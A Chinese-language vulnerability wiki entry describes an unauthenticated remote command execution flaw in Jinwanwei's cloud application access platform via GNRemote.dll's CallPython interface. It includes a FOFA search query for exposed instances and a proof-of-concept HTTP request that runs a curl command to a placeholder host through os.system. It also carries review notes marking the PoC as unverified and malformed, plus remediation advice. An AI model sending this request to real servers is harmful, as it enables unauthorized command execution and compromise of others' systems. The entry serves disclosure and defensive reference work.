---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "金万维云联应用系统接入平台 GNRemote.dll CallPython执行os.system"
product: "金万维云联应用系统接入平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，Python桥与curl/出网条件"
prerequisites: "前台匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%87%91%E4%B8%87%E7%BB%B4/%E9%87%91%E4%B8%87%E7%BB%B4-%E4%BA%91%E8%81%94%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E5%B9%B3%E5%8F%B0%20GNRemote.dll%20%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E.md"
fofa: "title=\"云联应用系统接入平台\""
id: "vw-f6b01983b503667a477da2cc"
entity_id: "ve-f6b01983b503667a477da2cc"
schema_version: "1"
previous_fofa_unverified: "title="
---

# 金万维云联应用系统接入平台 GNRemote.dll CallPython执行os.system

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：金万维云联应用系统接入平台；GNRemote.dll CallPython执行os.system
- 版本、配置及部署条件：版本未知，Python桥与curl/出网条件
- 认证与权限前提：前台匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 请求行curl+dnsHTTP/1.1缺空格把协议粘入参数，不是有效原始HTTP
- dns为占位不是可核回连域，需明确外带测试条件且无明文返回
- 无代码围栏；固定模板在野/高影响无来源，修复版本缺

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

金万维-云联应用系统接入平台 GNRemote.dll接口存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

影响版本

云联应用系统接入平台

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：title="云联应用系统接入平台"

POC/EXP：

```http
GET /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=curl+dns HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```


![image-20240729120809517](./.resource/金万维-云联应用系统接入平台GNRemote.dll前台RCE漏洞/media/image-20240729120809517.png)


![image-20240729120849418](./.resource/金万维-云联应用系统接入平台GNRemote.dll前台RCE漏洞/media/image-20240729120849418.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
